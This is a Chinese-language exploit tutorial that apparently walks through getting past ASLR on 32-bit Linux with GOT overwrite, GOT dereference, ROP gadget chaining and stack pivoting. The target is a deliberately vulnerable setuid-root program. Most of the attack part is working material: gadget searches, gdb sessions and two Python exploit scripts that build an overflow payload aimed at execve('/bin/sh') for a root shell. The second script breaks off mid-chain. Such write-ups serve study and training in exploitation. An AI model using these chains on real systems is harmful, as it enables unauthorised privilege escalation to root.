## Bypasing ASLR using GOT overwrite and GOT dereference

​	这篇文章中，使用了GOT覆盖和GOT取消引用技术来绕过共享库地址随机化。即使可执行文件没有所需的 PLT 存根代码，攻击者也可以使用这些技术绕过ASLR。	

​	<u>存在漏洞代码</u>：

```c
// vuln.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main (int argc, char **argv) {
	char buf[256];
	int i;
 	seteuid(getuid());
 	if(argc < 2) {
  		puts("Need an argument\n");
  		exit(-1);
 }
 	strcpy(buf, argv[1]);
 	printf("%s\nLen:%d\n", buf, (int)strlen(buf));
 	return 0;
}
```

​	<u>编译代码</u>(~~禁用ASLR~~；关闭栈保护；~~标记堆栈为可执行~~；ELF文件执行时获得root权限)：

```shell
#echo 2 > /proc/sys/kernel/randomize_va_space
$gcc -g -fno-stack-protector -o vuln vuln.c
$sudo chown root vuln
$sudo chgrp root vuln
$sudo chmod +s vuln
```

`注意: 此时可执行文件 vuln 中不存在 system@PLT; 可执行执行文件 vuln 中不存在字符串 "sh"`

​	`GOT overwrite`技术是攻击者用另一个libc函数的地址覆盖特定libc函数的GOT条目。例如，`GOT[getuid]`包含`getuid`函数地址，但它可以被`execve`函数地址覆盖。即将两个libc函数的偏移差加到`GOT[getuid]`时，就得到了`execve`函数地址。

```asm
offset_diff = execve_addr - getuid_addr 
GOT[getuid] = GOT[getuid] + offset_diff
```

​	`GOT dereference`是将`GOT[getuid]`的值复制到寄存器中，并将偏移量添加到寄存器内容中。因此，寄存器中包含所需的libc函数地址。例如`GOT[getuid]`包含`getuid`函数地址，它被复制到寄存器中。两个 libc 函数（execve和getuid）的偏移量之差被添加到寄存器内容中。最后跳转到寄存器值调用`execve`函数。

```asm
offset_diff = execve_addr - getuid_addr 
eax = GOT[getuid] 
eax = eax + offset_diff
```

​	所以，当发生缓冲区溢出时，我们需要识别一个函数并跳转到特定函数以实现`GOT overtwrite/dereference`。在这种情况下，需要用到`ROP`。

​	`ROP`技术是当攻击者获得了调用栈控制权，即使没有直接的方法，他也可以执行精心设计的机器指令来达到他想要的操作。例如，在`return-to-libc`攻击中，我们用system地址覆盖了返回地址来执行命令。但如果libc库中没有sytem和execve系列函数，攻击者就无法通过这种方法获得root shell。在这种情况下，使用`ROP`技术可以通过执行一系列的`gadget`来模拟所需的libc函数。

​	`gadget`是一组以`ret`结尾的汇编指令。攻击者用一个`gadget`覆盖返回地址，这个`gadget`包含一组汇编指令，类似于sytem()的前几条汇编指令。因此，这个`gadget`会执行system函数功能的一部分。system函数功能的剩余部分是是通过返回到其他的`gadget`来完成的。通过这种方式，链接一系列的`gadget`可以模拟system函数的功能。

​	那么，如何在可执行文件中找到可用的`gadget`? 许多工具（如ropeme、ROPgadget、rp++）可以帮助攻击者在二进制文件中找到gadgets。这些工具基本上是寻找`ret`指令，然后向后查找一系列有用的机器指令。

​	在本文中，我们不需要使用`rop gadget`来模拟任何libc功能，而是需要覆盖libc函数的GOT条目，或者是需要确保任一寄存器指向libc函数地址。下面用`ROP gadgets`实现`GOT overtwrite`和`GOT dereference`。

**GOT overwrite using ROP**

* Gadget 1: 首先，我们需要一个gadget，它可以将为GOT[getuid]添加偏移值。因此，寻找一个将值复制到内存位置的gadget。

  ```shell
  user@ubuntu:~/project$ ./rp++ --atsyntax -f ./vuln -r 1
  Trying to open './vuln'..
  Loading ELF information..
  FileFormat: Elf, Arch: Ia32
  Using the AT&T syntax..
  
  Wait a few seconds, rp++ is looking for gadgets..
  in PHDR
  0 found.
  
  in LOAD
  65 found.
  
  A total of 65 gadgets found.
  ...
  0x0804849e: addl %eax, 0x5D5B04C4(%ebx) ; ret  ;  (1 found)
  ...
  ```

  ​	如上图，找到了所需的gadget。现在如果可以让ebx包含`GOT[getuid] - 0x5D5B04C4` ，并且eax包含`offset_diff`，就可以成功执行GOT覆盖。

* Gadget 2：确保ebx包含getuid的GOT条目。getuid的GOT入口（如下图）位于`0x804a004`。因此 ebx 应该加载 0x804a004，但由于在 `add gadget `中将一个常量值 (0x5d5b04c4) 添加到 ebx，让我们从我们的 ebx 中减去该常量值，即`ebx = 0x804a004-0x5d5b04c4 = 0xaaa99b40`。现在我们需要找到一个将该值`0xaaa99b40`复制到 ebx 寄存器中的小工具。

  ```
  user@ubuntu:~/project$ objdump -R vuln 
  vuln:     file format elf32-i386
  
  DYNAMIC RELOCATION RECORDS
  ...
  0804a004 R_386_JUMP_SLOT   getuid
  ...
  ```

  ```
  user@ubuntu:~/project$ ./rp++ --atsyntax -f ./vuln -r 1
  Trying to open './vuln'..
  Loading ELF information..
  FileFormat: Elf, Arch: Ia32
  Using the AT&T syntax..
  
  Wait a few seconds, rp++ is looking for gadgets..
  in PHDR
  0 found.
  
  in LOAD
  65 found.
  
  A total of 65 gadgets found.
  ...
  0x08048380: popl %ebx ; ret  ;  (1 found)
  ...
  ```

  ​	如图，找到了`pop ebx`的gadget。因此，在将值 (0xaaa99b40) 压入堆栈并返回`pop ebx`指令后，ebx 包含 0xaaa99b40。

* Gadget 3：确保 eax 包含偏移差异。因此，我们需要找到一个gadget，将偏移差异复制到 eax 寄存器中。

  ```shell
  user@ubuntu:~/project$ gdb -q vuln
  ...
  (gdb) p execve
  $1 = {<text variable, no debug info>} 0xb7607fd0 <execve>
  (gdb) p getuid 
  $2 = {<text variable, no debug info>} 0xb7608aa0 <getuid>
  (gdb) p/x execve - getuid
  $3 = 0xfffff530
  
  
  user@ubuntu:~/project$ ./rp++ --atsyntax -f ./vuln -r 1
  Trying to open './vuln'..
  Loading ELF information..
  FileFormat: Elf, Arch: Ia32
  Using the AT&T syntax..
  
  Wait a few seconds, rp++ is looking for gadgets..
  in LOAD
  65 found.
  A total of 65 gadgets found.
  ...
  0x080484a3: popl %ebp ; ret  ;  (1 found)
  0x080485cf: popl %ebp ; ret  ;  (1 found)
  0x08048618: popl %ebp ; ret  ;  (1 found)
  0x08048380: popl %ebx ; ret  ;  (1 found)
  0x08048634: popl %ebx ; ret  ;  (1 found)
  ...
  ```

  ​	因此，需要将偏移量`0xfffff530`放入栈中并执行`pop eax`指令。但二进制vuln文件中，找不到` popl %eax; ret;`指令，因此在这里直接使用GOT覆盖技术是**不可能**的。

​	堆栈布局：下面描绘了gadget的链接以实现GOT覆盖。

```
						Gadget 1
					GOT[getuid]-0x5d5b04c4
						Gadget 2
						Offset			
						Gadget 3		<----------- Return Address
						AAAA			<----------- EBP
						...
						AAAA			<----------- buf_start
```

**GOT dereference using ROP**

* Gadget 1: 首先，需要一个gadget，它会向GOT[getuid]添加偏移差，并且需要将其结果加载到寄存器中。

  ```
  user@ubuntu:~/project$ ./rp++ --atsyntax -f ./vuln -r 4
  Trying to open './vuln'..
  Loading ELF information..
  FileFormat: Elf, Arch: Ia32
  Using the AT&T syntax..
  
  Wait a few seconds, rp++ is looking for gadgets..
  in PHDR
  0 found.
  
  in LOAD
  166 found.
  
  A total of 166 gadgets found.
  ...
  0x0804860e: addl -0x0B8A0008(%ebx), %eax ; addl $0x04, %esp ; popl %ebx ; popl %ebp ; ret ; (1 found)
  ...
  ```

  如图，找到一个将结果复制到寄存器中的gadget。现在，如果可以让ebx包含`GOT[getuid] + 0xb8a0008`并且eax包含偏移量之差`offset_diff`，就可以成功执行`GOT deference`。

* Gadget 2：`pop %ebx; ret;` gadget 已经在前文中找到了。

* Gadget 3：如前文所述，找不到指令`pop %eax; ret;`。

* Gadget 4：通过调用寄存器调用execve()，需要一个`call *eax`的gadget。

  ```
  user@ubuntu:~/project$ ./rp++ --atsyntax -f ./vuln -r 4
  ...
  0x080484cf: calll *%eax ; (1 found)
  ...
  ```

  找到了`call * eax`gadget，但仍然因为Gadget`popl %eax; ret;`Gadget 没找到，`GOT dereference`**不能直接实现**。

堆栈布局：下面描绘了gadget的链接以实现`GOT dereference`。

```
						Gadget 4
						Gadget 1
					GOT[getuid]+0xb8a0008
						Gadget 2
						Offset			
						Gadget 3		<----------- Return Address
						AAAA			<----------- EBP
						...
						AAAA			<----------- buf_start
```

**Manual ROP gadget search**

​	由于 rop gadget 工具无法找到`pop eax; ret`，我们可以尝试手动搜索是否可以找到任何有用的gadget来帮助我们将偏移量查找复制到eax寄存器中。反汇编二进制文件vuln：

```
objdump -d vuln > out
```

* Gadget 4: 需要执行功能将`offset_diff（0xfffff530）`放入到eax中。反汇编显示，mov指令将栈内容复制到eax中。

```
 ...
 80485b3:       8b 44 24 34             mov    0x34(%esp),%eax
 80485b7:       89 44 24 04             mov    %eax,0x4(%esp)
 80485bb:       ff 94 b3 20 ff ff ff    call   *-0xe0(%ebx,%esi,4)
 80485c2:       83 c6 01                add    $0x1,%esi
 80485c5:       39 fe                   cmp    %edi,%esi
 80485c7:       75 df                   jne    80485a8 <__libc_csu_init+0x38>
 80485c9:       83 c4 1c                add    $0x1c,%esp
 80485cc:       5b                      pop    %ebx
 80485cd:       5e                      pop    %esi
 80485ce:       5f                      pop    %edi
 80485cf:       5d                      pop    %ebp
 80485d0:       c3                      ret
 ...
```

​	但是`ret`指令与这条指令`0x80485b3`相去甚远，所以这里要确保执行指令到`ret`前`eax`都不会被修改。

<u>未修改的EAX</u>：这里实现如何在ret指令之前保持eax未修改。有一个调用指令`0x80485bb`加载了ebx和esi，如果我们修改这个调用指令，让它调用不修改eax的函数，就可以实现我们的目的。接下来找到一个函数 _fini ，它似乎没有修改eax寄存器。

```
0804861c <_fini>:
 804861c:       53                      push   %ebx
 804861d:       83 ec 08                sub    $0x8,%esp
 8048620:       e8 00 00 00 00          call   8048625 <_fini+0x9>
 8048625:       5b                      pop    %ebx
 8048626:       81 c3 cf 19 00 00       add    $0x19cf,%ebx
 804862c:       e8 1f fe ff ff          call   8048450 <__do_global_dtors_aux>
 8048631:       83 c4 08                add    $0x8,%esp
 8048634:       5b                      pop    %ebx
 8048635:       c3                      ret
 
08048450 <__do_global_dtors_aux>:
 8048450:       55                      push   %ebp
 8048451:       89 e5                   mov    %esp,%ebp
 8048453:       53                      push   %ebx
 8048454:       83 ec 04                sub    $0x4,%esp
 8048457:       80 3d 28 a0 04 08 00    cmpb   $0x0,0x804a028
 804845e:       75 3f                   jne    804849f <__do_global_dtors_aux+0x
 ...
 804849f:       83 c4 04                add    $0x4,%esp
 80484a2:       5b                      pop    %ebx
 80484a3:       5d                      pop    %ebp
 80484a4:       c3                      ret  
```

​	可以看到，_fini 函数调用 _do_global_dtors_aux函数，在指令`0x8048457`处，如果我们提前将 0x1 设置为内存位置 `0x804a028`的值 ，它将直接跳转到`0x804849f`，从而这里的 eax 可以保持不变。

​	那么，要调用_fini函数，ebx和esi寄存器的值应该为多少？

（1）首先，需要找到一个包含_fini(0x804861c)地址的内存位置。如下图所示，内存地址`0x8049f3c`包含了地址`0x804861c`：

```
0x8049f28 :    0x00000001 0x00000010 0x0000000c 0x08048354
0x8049f38 <_DYNAMIC+16>: 0x0000000d 0x0804861c 0x6ffffef5 0x080481ac
0x8049f48 <_DYNAMIC+32>: 0x00000005 0x0804826c
```

（2）将esi设置为`0x01020101`，这个值是首选。因为esi的值中不能有0x0，还要确保存储到ebx中的值也不为0，因此选取`0x01020101`。

（3）设置ebx，如下图所示：

```asm
ebx+esi*4-0xe0 = 0x8049f3c 
ebx = 0x8049f3c -(0x01020101*0x4) + 0xe0 
ebx = 0x3fc9c18
```

​	因此，为了调用 `_fini`函数，我们需要确保ebx和esi分别加载 `0x3fc9c18` 和 `0x01020101`。为了确保在  `_fini return` 指令（0x8048635）和 ret 指令（0x80485d0）之间不会修改eax，这可以通过设置` edi = esi + 1`来实现。当` edi = esi + 1`时，跳转指令`0x80485c7`确保跳转到指令`0x80485c9`，一直执行到 ret（0x80485d0）eax都没有被修改。

* Gadget 5：实现`ebx = 0x3fc9c18`:

  ```
  user@ubuntu:~/project$ ./rp++ --atsyntax -f ./vuln -r 1
  ...
  0x08048380: popl %ebx ; ret ; (1 found)
  ...
  ```

* Gadget 6：实现`esi = 0x01020101`，`edi = 0x01020102`:

  ```
  user@ubuntu:~/project$ ./rp++ --atsyntax -f ./vuln -r 3
  ...
  0x080485cd: popl %esi ; popl %edi ; popl %ebp ; ret ; (1 found)
  ...
  ```

* Gadget 7：将0x1复制到内存地址`0x804a028`：

  ```
  user@ubuntu:~/project$ ./rp++ --atsyntax -f ./vuln -r 5
  ...
  0x08048498: movb $0x00000001, 0x0804A028 ; addl $0x04, %esp ; popl %ebx ; popl %ebp ; ret ; (1 found)
  ...
  ```

<u>Gadget Search Summary:</u>

* 为了成功调用Gadget 1，我们需要Gadget 2 和Gadget 3.
* 由于Gadget 3不可用，我们手动搜索并找到了Gadget 4，5，6，7.
* 为了成功调用Gadget 4，我们需要Gadget 5，6，7.

<u>漏洞利用代码</u>：下面的漏洞利用代码用 execve 函数地址覆盖 GOT[getuid]

```python
#!/usr/bin/enb python
import struct
from subprocess import call

'''
    G1: 0x0804849e: addl %eax, 0x5D5B04C4(%ebx) ; ret ;
    G2: 0x080484a2: popl %ebx ; pop ebp; ret ;
    G3: 0x????????: popl %eax ; ret ; (NOT found)
    G4: 0x080485b3: mov 0x34(%esp),%eax...
    G5: 0x08048380: pop ebx ; ret ;
    G6: 0x080485cd: pop esi ; pop edi ; pop ebp ; ret ;
    G7: 0x08048498: movb $0x1,0x804a028...
'''

g1 = 0x0804849e
g2 = 0x080484a2
g4 = 0x080485b3
g5 = 0x08048380
g6 = 0x080485cd
g7 = 0x08048498
dummy = 0xdeadbeef
esi = 0x01020101
edi = 0x01020102
ebx = 0x3fc9c18 #ebx = 0x8049f3c - (esi*4) + 0xe0
off = 0xfffff530

# endianess convertion
def conv(num):
    return struct.pack("<I",num)


buf = "A" * 268 #Junk
buf += conv(g7) #movb $0x1,0x804a028; add esp, 0x04; pop ebx; pop ebp; ret;
buf += conv(dummy)
buf += conv(dummy)
buf += conv(dummy)

buf += conv(g6) #pop esi; pop edi; pop ebp; ret;
buf += conv(esi) #esi
buf += conv(edi) #edi
buf += conv(dummy)

buf += conv(g5) #pop ebx; ret;
buf += conv(ebx) #ebx
buf += conv(g4) #mov 0x34(%esp),%eax; ...

for num in range(0, 11):
    buf += conv(dummy)

buf += conv(g2) #pop ebx; pop ebp; ret;
ebx = 0xaaa99b40 #getuid@GOT-0x5d5b04c4
buf += conv(ebx)
buf += conv(off)
buf += conv(g1) #addl %eax, 0x5D5B04C4(%ebx); ret;
buf += "B" * 4


print "Calling vulnerable program"
call(["./vuln", buf])

```

​	执行上述漏洞利用代码会生成一个核心文件，打开核心文件可以看到GOT[getuid]被execve函数地址覆盖：

```
user@ubuntu:~/project$ ulimit -c unlimited
user@ubuntu:~/project$ sudo sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t
kernel.core_pattern = /tmp/core-%e.%p.%h.%t

user@ubuntu:~/project$ sudo python exp.py 
Calling vulnerable program
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��ﾭ�ﾭ�ﾭ�ͅﾭހ�����ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭޢ�@���0�����BBBB
Len:376

user@ubuntu:~/project$ sudo gdb -q vuln
[sudo] password for user: 
Reading symbols from /home/user/project/vuln...(no debugging symbols found)...done.
(gdb) core-file core-vuln.16215.ubuntu.1653843029 
[New LWP 16215]
warning: Can't read pathname for load map: Input/output error.
Core was generated by `./vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.
Program terminated with signal 11, Segmentation fault.
#0  0x42424242 in ?? ()
(gdb) x/lxw 0x804a004
0x804a004 <getuid@got.plt>:	0xb7686fd0
(gdb) p getuid
$1 = {<text variable, no debug info>} 0xb7687aa0 <getuid>
(gdb) p execve
$2 = {<text variable, no debug info>} 0xb7686fd0 <execve>
(gdb) 

```

​	如上，已经用execve地址覆盖了GOT[getuid]，即对getuid的函数调用都会调用execve函数。

<u>**生成root shell**</u>

​	为了生成root shell，需要将下面的**libc函数链**（及其参数）复制到栈中。

```
seteuid@PLT | getuid@PLT | seteuid_arg | execve_arg1 | execve_arg2 | execve_arg3
```

​	首先，得到`setuid@plt`和`getuid@plt`的地址：

```
(gdb) disassemble main
Dump of assembler code for function main:
   ...
   0x080484e1 <+13>:	call   0x80483b0 <getuid@plt>
   0x080484e6 <+18>:	mov    %eax,(%esp)
   0x080484e9 <+21>:	call   0x80483c0 <seteuid@plt>
   ...
```

​	因此，所需参数如下：

	*  setuid@PLT – setuid 的 plt 代码地址 (0x80483c0)。
	*  getuid@PLT – getuid 的 plt 代码地址 (0x80483b0)。
	*  seteuid_arg 应该为 "0" 以获得root shell。
	*  execve_arg1 – 文件名 – 字符串"/bin/sh"的地址.
	*  execve_arg2 – argv – 参数数组的地址，其内容为 `[Address of “/bin/sh”, NULL]`
	*  execve_arg3 – envp – NULL。

​    由于不能直接用零溢出缓冲区，可以使用strcpy调用链来复制 ”0“ 来替代`seteuid_arg`。但这个方法不能在这里使用，因为栈是随机的，要知道`seteuid_arg`在栈中所处位置的地址比较困难。这时候可以使用**自定义栈和栈旋转技术**来绕过**栈地址随机化**。

​	**自定义栈**是攻击者控制的栈区域。这种技术将libc函数链与函数参数一起复制以绕过栈地址随机化。由于攻击者选择进程地址无关的、可写的内存区域作为自定义栈，因此栈地址随机化被绕过了。在二进制文件vuln中，可写且地址无关的内存区域从`0x804a000`到`0x804b000`：

```
(gdb) info proc mappings
process 17122
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/user/project/vuln
	 0x8049000  0x804a000     0x1000        0x0 /home/user/project/vuln
	 0x804a000  0x804b000     0x1000     0x1000 /home/user/project/vuln
	0xb7614000 0xb7615000     0x1000        0x0 
	0xb7615000 0xb77b4000   0x19f000        0x0 /lib/i386-linux-gnu/libc-2.15.so
	0xb77b4000 0xb77b6000     0x2000   0x19f000 /lib/i386-linux-gnu/libc-2.15.so
	0xb77b6000 0xb77b7000     0x1000   0x1a1000 /lib/i386-linux-gnu/libc-2.15.so
	0xb77b7000 0xb77ba000     0x3000        0x0 
	0xb77ca000 0xb77cc000     0x2000        0x0 
	0xb77cc000 0xb77cd000     0x1000        0x0 [vdso]
	0xb77cd000 0xb77ed000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
	0xb77ed000 0xb77ee000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
	0xb77ee000 0xb77ef000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
	0xbfeb7000 0xbfed8000    0x21000        0x0 [stack]

```

​	即包含 `.data` 和 `.bss `段的内存区域可用作自定义堆栈位置。这里选择自定义堆栈位置为 `0x804a360`。

​	下一步，需要将libc函数链及其参数复制到自定义栈。

```
seteuid@PLT | getuid@PLT | seteuid_arg | execve_arg1 | execve_arg2 | execve_arg3
```

​	这可以使用一系列strcpy函数覆盖实际栈的返回地址。例如，要将`seteuid@PLT (0x80483c0) `复制到自定义栈，需要：

* 四个 strcpy调用，每个十六进制值（0x08、0x04、0x83、0xc0）调用一个 strcpy。
* strcpy 调用的源参数应该包含所需十六进制值的可执行内存区域的地址，并且需要确保不修改所选内存位置中存在的值。
* strcpy 调用的目标参数应该是自定义堆栈位置的地址。

​    按照上述过程，设置完整的自定义栈，然后需要使用栈旋转技术从实际栈地址移动到自定义栈中。

​	**栈旋转**是使用`leave ret`指令完成的。`leave`指令转化为`mov ebp, esp; pop ebp`，因此在`leave`指令之前，在EBP写入自定义栈地址，从而`leave`指令可以跳转到自定义栈处。进而执行自定义栈中的一系列libc函数，最终生成root shell。

​	<u>完整的漏洞利用代码</u>：

```python
#!/usr/bin/enb python
import struct
from subprocess import call


# GOT overwrite using ROP gadgets
'''
    G1: 0x0804849e: addl %eax, 0x5D5B04C4(%ebx) ; ret ;
    G2: 0x080484a2: popl %ebx ; pop ebp; ret ;
    G3: 0x????????: popl %eax ; ret ; (NOT found)
    G4: 0x080485b3: mov 0x34(%esp),%eax...
    G5: 0x08048380: pop ebx ; ret ;
    G6: 0x080485cd: pop esi ; pop edi ; pop ebp ; ret ;
    G7: 0x08048498: movb $0x1,0x804a028...
'''

g1 = 0x0804849e
g2 = 0x080484a2
g4 = 0x080485b3
g5 = 0x08048380
g6 = 0x080485cd
g7 = 0x08048498
dummy = 0xdeadbeef
esi = 0x01020101
edi = 0x01020102
ebx = 0x3fc9c18 #ebx = 0x8049f3c - (esi*4) + 0xe0
off = 0xfffff530


# Custom Stack
# 0x804a360 - Dummy EBP|seteuid@PLT|getuid@PLT|seteuid_arg|execve_arg1|execve_arg2|execve_arg3
cust_esp = 0x804a360        # Custom stack base address
cust_base_esp = 0x804a360   # Custom stack base address
# seteuid@PLT 0x80483c0
seteuid_oct1 = 0x8048143      #08
seteuid_oct2 = 0x8048130      #04
seteuid_oct3 = 0x8048355      #83
seteuid_oct4 = 0x80481cb      #c0
# getuid@PLT 0x80483b0
getuid_oct1 = 0x8048143       #08
getuid_oct2 = 0x8048130       #04
getuid_oct3 = 0x8048355       #83
getuid_oct4 = 0x80483dc       #b0
# seteuid_arg 0x00000000
seteuid_null_arg = 0x804a360
# execve_arg1 0x804ace0
execve_arg1_oct1 = 0x8048143  #08
execve_arg1_oct2 = 0x8048130  #04
execve_arg1_oct3 = 0x8048f44  #AC
execve_arg1_oct4 = 0x80484fc  #e0
# execve_arg2 0x804ace8
execve_arg2_oct1 = 0x8048143  #08
execve_arg2_oct2 = 0x8048130  #04
execve_arg2_oct3 = 0x8048f44  #AC
execve_arg2_oct4 = 0x80484fb  #e8
# execve_arg3 0x00000000
execve_null_arg = 0x804a360
execve_path_dst = 0x804ace0   # Custom stack location which contains execve_path "/bin/sh"
execve_path_oct1 = 0x8048154  #/
execve_path_oct2 = 0x8048157  #b
execve_path_oct3 = 0x8048156  #i
execve_path_oct4 = 0x804815e  #n
execve_path_oct5 = 0x8048162  #s
execve_path_oct6 = 0x80483a6  #h
execve_argv_dst = 0x804ace8   # Custom stack location which contains execve_argv [0x804ace0, 0x0]
execve_argv1_oct1 = 0x8048143 #08
execve_argv1_oct2 = 0x8048130 #04
execve_argv1_oct3 = 0x8048f44 #AC
execve_argv1_oct4 = 0x80484fc #e0
strcpy_plt = 0x80483d0        # strcpy@PLT
ppr_addr = 0x080485ce         # popl %edi ; popl %ebp ; ret ;

# Stack Pivot
pr_addr = 0x080484a3          # popl %ebp ; ret ;
lr_addr = 0x08048569          # leave ; ret ;

# endianess convertion
def conv(num):
    return struct.pack("<I",num)

buf = "A" * 268 #Junk
buf += conv(g7) #movb $0x1,0x804a028; add esp, 0x04; pop ebx; pop ebp; ret;
buf += conv(dummy)
buf += conv(dummy)
buf += conv(dummy)

buf += conv(g6) #pop esi; pop edi; pop ebp; ret;
buf += conv(esi) #esi
buf += conv(edi) #edi
buf += conv(dummy)

buf += conv(g5) #pop ebx; ret;
buf += conv(ebx) #ebx
buf += conv(g4) #mov 0x34(%esp),%eax; ...

for num in range(0, 11):
    buf += conv(dummy)

buf += conv(g2) #pop ebx; pop ebp; ret;
ebx = 0xaaa99b40 #getuid@GOT-0x5d5b04c4
buf += conv(ebx)
buf += conv(off)
buf += conv(g1) #addl %eax, 0x5D5B04C4(%ebx); ret;


# Custom Stack
#Below stack frames are for strcpy (to copy seteuid@PLT to custom stack)
cust_esp += 4    #Increment by 4 to get past Dummy EBP.
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(cust_esp)
buf += conv(seteuid_oct4)
cust_esp += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(cust_esp)
buf += conv(seteuid_oct3)
cust_esp += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(cust_esp)
buf += conv(seteuid_oct2)
cust_esp += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(cust_esp)
buf += conv(seteuid_oct1)
#Below stack frames are for strcpy (to copy getuid@PLT to custom stack)
cust_esp += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(cust_esp)
buf += conv(getuid_oct4)
cust_esp += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(cust_esp)
buf += conv(getuid_oct3)
cust_esp += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(cust_esp)
buf += conv(getuid_oct2)
cust_esp += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(cust_esp)
buf += conv(getuid_oct1)
#Below stack frames are for strcpy (to copy seteuid arg  to custom stack)
cust_esp += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(cust_esp)
buf += conv(seteuid_null_arg)
cust_esp += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(cust_esp)
buf += conv(seteuid_null_arg)
cust_esp += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(cust_esp)
buf += conv(seteuid_null_arg)
cust_esp += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(cust_esp)
buf += conv(seteuid_null_arg)
#Below stack frames are for strcpy (to copy execve_arg1  to custom stack)
cust_esp += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(cust_esp)
buf += conv(execve_arg1_oct4)
cust_esp += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(cust_esp)
buf += conv(execve_arg1_oct3)
cust_esp += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(cust_esp)
buf += conv(execve_arg1_oct2)
cust_esp += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(cust_esp)
buf += conv(execve_arg1_oct1)
#Below stack frames are for strcpy (to copy execve_arg2  to custom stack)
cust_esp += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(cust_esp)
buf += conv(execve_arg2_oct4)
cust_esp += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(cust_esp)
buf += conv(execve_arg2_oct3)
cust_esp += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(cust_esp)
buf += conv(execve_arg2_oct2)
cust_esp += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(cust_esp)
buf += conv(execve_arg2_oct1)
#Below stack frames are for strcpy (to copy execve_arg3  to custom stack)
cust_esp += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(cust_esp)
buf += conv(execve_null_arg)
cust_esp += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(cust_esp)
buf += conv(execve_null_arg)
cust_esp += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(cust_esp)
buf += conv(execve_null_arg)
cust_esp += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(cust_esp)
buf += conv(execve_null_arg)
#Below stack frame is for strcpy (to copy execve path "/bin/sh" to custom stack @ loc 0x804ac60)
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(execve_path_dst)
buf += conv(execve_path_oct1)
execve_path_dst += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(execve_path_dst)
buf += conv(execve_path_oct2)
execve_path_dst += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(execve_path_dst)
buf += conv(execve_path_oct3)
execve_path_dst += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(execve_path_dst)
buf += conv(execve_path_oct4)
execve_path_dst += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(execve_path_dst)
buf += conv(execve_path_oct1)
execve_path_dst += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(execve_path_dst)
buf += conv(execve_path_oct5)
execve_path_dst += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(execve_path_dst)
buf += conv(execve_path_oct6)
#Below stack frame is for strcpy (to copy execve argv[0] (0x804ac60) to custom stack @ loc 0x804ac68)
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(execve_argv_dst)
buf += conv(execve_argv1_oct4)
execve_argv_dst += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(execve_argv_dst)
buf += conv(execve_argv1_oct3)
execve_argv_dst += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(execve_argv_dst)
buf += conv(execve_argv1_oct2)
execve_argv_dst += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(execve_argv_dst)
buf += conv(execve_argv1_oct1)
#Below stack frame is for strcpy (to copy execve argv[1] (0x0) to custom stack @ loc 0x804ac6c)
execve_argv_dst += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(execve_argv_dst)
buf += conv(execve_null_arg)
execve_argv_dst += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(execve_argv_dst)
buf += conv(execve_null_arg)
execve_argv_dst += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
buf += conv(execve_argv_dst)
buf += conv(execve_null_arg)
execve_argv_dst += 1
buf += conv(strcpy_plt)
buf += conv(ppr_addr)
